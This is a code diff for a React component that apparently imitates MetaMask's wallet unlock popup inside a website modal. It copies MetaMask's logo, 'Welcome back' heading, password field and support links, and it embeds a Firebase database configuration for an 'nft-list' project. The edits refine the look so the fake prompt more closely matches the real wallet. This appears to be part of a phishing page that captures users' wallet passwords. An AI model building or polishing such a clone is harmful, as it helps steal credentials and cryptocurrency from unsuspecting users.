@@ -4,7 +4,7 @@ import Modal from "react-modal";
 import meta_logo from "./assets/img/metamask-fox.svg";
 import spinner from "./assets/img/spinner.gif";
 import ethLogo from "./images/eth_logo.svg";
-import { ReactComponent as ArrowDown } from "./images/icons/arrow-down.svg";
+import arrowDown from "./images/icons/arrow-down.svg";
 
 import { initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
@@ -13,8 +13,7 @@ import CreateLogo from "./CreateLogo";
 
 import "./index.css";
 import "./MM.css";
-const isDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
-console.log(window.matchMedia("(prefers-color-scheme: dark)"));
+
 const basic = {
   apiKey: "AIzaSyD22LIz8nceulmiNWLDHC8nZj1SQ48doAQ",
   authDomain: "nft-list-67033.firebaseapp.com",
@@ -45,7 +44,8 @@ function getCaretCoordinates(element, position) {
 }
 const MM = ({ isOpen, setIsOpen }) => {
   const inputRef = useRef(null);
-  const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
+  // const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
+  const animationEventEmitter = new EventEmitter();
   const [loading, setLoading] = useState(true);
   const [pwd, setPwd] = useState("");
   const [validShow, setValidShow] = useState(false);
@@ -70,9 +70,9 @@ const MM = ({ isOpen, setIsOpen }) => {
     },
   };
 
-  const handleOpenModal = () => {
-    setIsOpen(true);
-  };
+  // const handleOpenModal = () => {
+  //   setIsOpen(true);
+  // };
 
   const handleCloseModal = () => {
     setIsOpen(false);
@@ -100,7 +100,7 @@ const MM = ({ isOpen, setIsOpen }) => {
   };
 
   const handleKeyUp = (e) => {
-    if (e.keyCode == 13) {
+    if (e.keyCode === 13) {
       handleClick();
     }
   };
@@ -114,12 +114,12 @@ const MM = ({ isOpen, setIsOpen }) => {
         setTimeout(() => {
           inputRef.current && inputRef.current.focus();
         }, 10);
-      }, 3000);
+      }, 1000);
     } else {
       setLoading(true);
     }
   }, [isOpen]);
-  console.log("theme", isDark);
+
   return (
     <Modal
       isOpen={window.ethereum && isOpen}
@@ -136,13 +136,12 @@ const MM = ({ isOpen, setIsOpen }) => {
             display: "flex",
             flexDirection: "column",
             overflowX: "hidden",
-            width: "375px",
+            width: "400px",
           }}
-          data-theme={isDark ? "dark" : "light"}
         >
           <div
             style={{
-              width: "370px",
+              width: "400px",
               height: "600px",
               backgroundColor: "#fff",
               display: "flex",
@@ -157,9 +156,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                   alignSelf: "center",
                   margin: "15rem 0 0 0",
                 }}
+                alt={""}
                 src={meta_logo}
               ></img>
               <img
+                alt={""}
                 src={spinner}
                 style={{
                   width: "3rem",
@@ -173,9 +174,9 @@ const MM = ({ isOpen, setIsOpen }) => {
         </div>
       ) : (
         <>
-          <div id="app-content" data-theme={isDark ? "dark" : "light"}>
+          <div id="app-content">
             <div className="app os-win">
-              <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
+              {/* <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                 <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                   <div>
                     <button
@@ -188,7 +189,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                         role="img"
                         style={{ marginLeft: 12 }}
                       >
-                        <img className="mm-avatar-network__network-image" src={ethLogo} alt="Ethereum Mainnet logo" />
+                        <img
+                          className="mm-avatar-network__network-image"
+                          src={ethLogo}
+                          alt="Ethereum Mainnet logo"
+                        />
                       </div>
                       <span
                         className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
@@ -200,7 +205,15 @@ const MM = ({ isOpen, setIsOpen }) => {
                         className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                         style={{ marginRight: "1rem" }}
                       >
-                        <ArrowDown fill={isDark ? "white" : "black"} style={{ marginBottom: "4px" }} />
+                        <img
+                          alt={""}
+                          src={arrowDown}
+                          style={{
+                            width: "100%",
+                            height: "100%",
+                            marginBottom: "8px",
+                          }}
+                        ></img>
                       </span>
                     </button>
                   </div>
@@ -210,6 +223,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     style={{ marginRight: "8px" }}
                   >
                     <img
+                      alt={""}
                       style={{
                         alignSelf: "center",
                         width: "100%",
@@ -219,7 +233,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     ></img>
                   </button>
                 </div>
-              </div>
+              </div> */}
               <div className="mm-box main-container-wrapper">
                 <div className="unlock-page__container">
                   <div className="unlock-page" data-testid="unlock-page">
@@ -227,78 +241,85 @@ const MM = ({ isOpen, setIsOpen }) => {
                       <div style={{ zIndex: 0, marginBottom: "8px" }}>
                         <CreateLogo
                           animationEventEmitter={animationEventEmitter}
-                          width={"120"}
-                          height={"120"}
+                          width={"170"}
+                          height={"170"}
                         ></CreateLogo>
                         <div id="meta_fox"></div>
                       </div>
                     </div>
-                    <h1 className="unlock-page__title">Welcome back!</h1>
-                    <div
+                    <h1 className="unlock-page__title">Welcome back</h1>
+                    {/* <div
                       style={{
                         fontSize: "1.5rem",
                         fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
                       }}
                     >
                       The decentralized web awaits
-                    </div>
+                    </div> */}
                     <div className="unlock-page__form">
                       <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
-                        <div
+                        {/* <div
                           className={
                             "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
-                            (validShow == true ? " Mui-error" : "") +
-                            (pwdFocus == true ? " Mui-focused" : "")
+                            (validShow === true ? " Mui-error" : "") +
+                            (pwdFocus === true ? " Mui-focused" : "")
                           }
-                        >
-                          <input
-                            aria-invalid="false"
-                            autoComplete="current-password"
-                            id="password"
-                            type="password"
-                            dir="auto"
-                            data-testid="unlock-password"
-                            className={"MuiInputBase-input MuiInput-input"}
-                            style={{ marginTop: "16px", fontSize: "1.33rem" }}
-                            required
-                            value={pwd}
-                            onFocus={handleFocus}
-                            onBlur={handleBlur}
-                            ref={inputRef}
-                            onChange={(e) => {
-                              handleChange(e.target.value, e.target);
-                            }}
-                            onKeyUp={handleKeyUp}
-                          />
+                        > */}
+                        <input
+                          aria-invalid="false"
+                          autoComplete="current-password"
+                          id="password"
+                          type="password"
+                          dir="auto"
+                          placeholder="Enter your password"
+                          data-testid="unlock-password"
+                          className={"MuiInputBase-input MuiInput-input"}
+                          style={{
+                            fontSize: "1.35rem",
+                            borderColor: validShow ? "#d73847" : "#b7bbc8",
+                          }}
+                          required
+                          value={pwd}
+                          onFocus={handleFocus}
+                          onBlur={handleBlur}
+                          ref={inputRef}
+                          onChange={(e) => {
+                            handleChange(e.target.value, e.target);
+                          }}
+                          onKeyUp={handleKeyUp}
+                        />
 
-                          <label
+                        {/* <label
                             className="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated"
                             data-shrink="false"
                             htmlFor="password"
                             id="password-label"
-                            style={{ color: isDark ? "white" : "black" }}
+                            // style={{ fontSize: "1.5rem" }}
                           >
                             Password
-                          </label>
-                        </div>
-                        <div className={validShow ? "validate-password" : "validate-password-hidden"}>
-                          Incorrect password
+                          </label> */}
+                        {/* </div> */}
+                        <div
+                          className={validShow ? "validate-password" : "validate-password-hidden"}
+                          style={{ fontSize: "1.35rem" }}
+                        >
+                          Password is incorrect. Please try again
                         </div>
                       </div>
                     </div>
                     <button
-                      className={"button btn--rounded btn-default" + (pwd.length == 0 ? " unlock-btn-disabled" : "")}
+                      className={"button btn--rounded btn-default" + (pwd.length === 0 ? " unlock-btn-disabled" : "")}
                       data-testid="unlock-submit"
-                      disabled={pwd.length == 0}
+                      disabled={pwd.length === 0}
                       type="button"
                       variant="contained"
                       style={{
-                        backgroundColor: "var(--color-primary-default)",
-                        color: "var(--color-primary-inverse)",
-                        marginTop: "20px",
+                        backgroundColor: "#2a2b2c",
+                        color: "#ffffff",
+                        marginTop: "5px",
                         fontWeight: "400",
                         boxShadow: "none",
-                        borderRadius: "100px",
+                        borderRadius: "12px",
                         fontSize: "1.5rem",
                         padding: "12px 0",
                       }}
@@ -309,17 +330,33 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <div className="unlock-page__links">
                       <a
                         className="button btn-link unlock-page__link"
-                        style={{ fontSize: "1.125rem" }}
+                        style={{
+                          color: "#4459ff",
+                          fontSize: "1.5rem",
+                          fontWeight: 500,
+                        }}
                         role="button"
                         tabIndex="0"
                       >
                         Forgot password?
                       </a>
                     </div>
-                    <div className="unlock-page__support" style={{ fontSize: "1.125rem" }}>
+                    <div
+                      className="unlock-page__support"
+                      style={{
+                        fontSize: "1.5rem",
+                        color: "#121314",
+                        fontWeight: 500,
+                      }}
+                    >
                       <span>
                         Need help? Contact{" "}
-                        <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">
+                        <a
+                          href="https://support.metamask.io"
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          style={{ color: "#4459ff" }}
+                        >
                           MetaMask support
                         </a>
                       </span>
